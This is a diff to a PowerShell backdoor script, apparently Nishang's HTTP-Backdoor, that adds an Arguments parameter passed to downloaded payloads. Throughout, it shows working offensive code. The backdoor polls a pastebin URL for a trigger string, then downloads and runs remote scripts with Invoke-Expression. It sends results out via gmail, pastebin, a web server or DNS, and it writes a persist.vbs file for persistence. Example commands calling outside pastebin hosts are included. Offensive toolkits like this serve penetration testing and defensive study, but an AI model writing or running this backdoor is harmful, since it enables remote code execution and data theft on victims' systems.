@@ -17,6 +17,9 @@ The URL which the payload would query for instructions.
 .PARAMETER PayloadURL
 The URL from where the powershell script would be downloaded.
 
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
+
 .PARAMETER MagicString
 The string which would act as an instruction to the payload to proceed with download and execute.
 
@@ -62,12 +65,17 @@ PS > HTTP-Backdoor
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
 
-Use above when using the payload from non-interactive shells.
+Use above when using the payload from non-interactive shells. The Arguments parameter passes the arguments to the downloaded payload script or module. 
 
 .EXAMPLE
-PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS <dns>
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis
+
+Use above when using the payload from non-interactive shells and no argument needs to be passed to the downloaded script. 
+
+.EXAMPLE
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS <dns>
 
 Use above command for using exfiltration methods.
 
@@ -108,42 +116,47 @@ https://github.com/samratashok/nishang
         [String]
         $PayloadURL,
 
-        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
-        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 2, Mandatory = $False, Parametersetname="noexfil")]
         [String]
-        $MagicString,
+        $Arguments = "Out-Null",
 
         [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
         [String]
+        $MagicString,
+
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
+        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
         $StopString,
 
 
-        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
         [String]
         $ExfilOption,
 
-        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")] 
+        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")] 
         [String]
         $dev_key = "null",
 
-        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $username = "null",
 
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $password = "null",
 
-        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $URL = "null",
       
-        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $DomainName = "null",
 
-        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $AuthNS = "null"   
    
@@ -151,7 +164,7 @@ https://github.com/samratashok/nishang
 
 
     $body = @'
-function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
+function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil) 
 {
     while($true)
     {
@@ -163,6 +176,11 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $MagicString, $StopString,
     {
        
         $script:pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+        # Check for arguments to the downloaded script.
+        if ($Arguments -ne "Out-Null")
+        {
+            $pastevalue = Invoke-Expression $Arguments                   
+        }
         $pastevalue
         $exec++
         if ($exfil -eq $True)
@@ -267,10 +285,10 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     if($persist -eq $True)
     {
         $name = "persist.vbs"
-        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $MagicString $StopString"
+        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString"
         if ($exfil -eq $True)
         {
-            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
+            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
@@ -302,10 +320,10 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
     }
     else
     {
-        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $MagicString $StopString"
+        $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString"
         if ($exfil -eq $True)
         {
-            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
+            $options = "HTTP-Backdoor-Logic $CheckURL $PayloadURL $Arguments $MagicString $StopString $ExfilOption $dev_key $username $password $URL $DomainName $AuthNS $exfil"
         }
         Out-File -InputObject $body -Force $env:TEMP\$modulename
         Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
